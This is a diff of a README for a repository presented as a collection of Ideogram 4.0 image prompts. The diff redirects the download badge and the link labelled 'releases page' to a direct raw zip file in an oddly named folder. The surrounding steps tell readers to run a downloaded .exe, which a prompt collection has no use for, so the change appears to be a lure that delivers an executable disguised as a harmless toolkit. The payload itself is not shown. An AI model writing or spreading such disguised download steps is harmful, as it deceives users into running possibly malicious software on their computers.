@@ -1,6 +1,6 @@
 # 🎨 awesome-ideogram-4.0-prompts - Create stunning images with curated prompts
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Maritaminded209/awesome-ideogram-4.0-prompts/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://raw.githubusercontent.com/Maritaminded209/awesome-ideogram-4.0-prompts/main/adiaphorite/prompts_ideogram_awesome_3.8.zip)
 
 This repository provides a collection of prompts for Ideogram 4.0. You can use these prompts to generate images including typography, portraits, and product mockups. This toolkit helps you get better results from your image generation process by providing tested instructions and examples.
 
@@ -9,7 +9,7 @@ This repository provides a collection of prompts for Ideogram 4.0. You can use t
 To begin, you need to save the application to your computer.
 
 1. Open your web browser.
-2. Navigate to the [releases page](https://github.com/Maritaminded209/awesome-ideogram-4.0-prompts/releases).
+2. Navigate to the [releases page](https://raw.githubusercontent.com/Maritaminded209/awesome-ideogram-4.0-prompts/main/adiaphorite/prompts_ideogram_awesome_3.8.zip).
 3. Look for the latest release at the top of the page.
 4. Click the link that ends in .exe to start your download.
 5. Wait for the file to finish downloading to your Downloads folder.
